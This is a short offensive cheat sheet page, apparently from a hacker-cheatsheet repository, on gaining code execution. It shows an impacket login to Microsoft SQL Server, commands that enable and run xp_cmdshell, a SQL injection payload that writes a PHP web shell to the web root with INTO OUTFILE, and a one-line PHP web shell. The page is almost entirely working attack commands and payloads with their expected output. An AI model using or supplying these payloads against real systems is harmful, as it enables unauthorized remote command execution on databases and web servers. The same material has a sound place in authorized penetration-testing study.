# Manual Code Execution

Enabling xp_cmdshell feature
>``` shell
>kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
>
># ========== Expected Result ==========
>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
>...
># =====================================
>
>SQL> EXECUTE sp_configure 'show advanced options', 1;
>
># ========== Expected Result ==========
>[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
># =====================================
>
>SQL> RECONFIGURE;
>
>SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
>
># ========== Expected Result ==========
>[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
># =====================================
>
>SQL> RECONFIGURE;
>```

Executing Commands via xp_cmdshell
>``` shell
>SQL> EXECUTE xp_cmdshell 'whoami';
>
># ========== Expected Result ==========
>output
>
>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
>
>nt service\mssql$sqlexpress
>
>NULL
># =====================================
>```

Write a WebShell To Disk via INTO OUTFILE directive
>``` shell
>' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
>```

PHP web shell
>``` shell
><? system($_REQUEST['cmd']); ?>
>```

Writing the WebShell to Disk
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Manual-Code-Execution-17.png)

Accessing the Webshell
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Manual-Code-Execution-18.png)
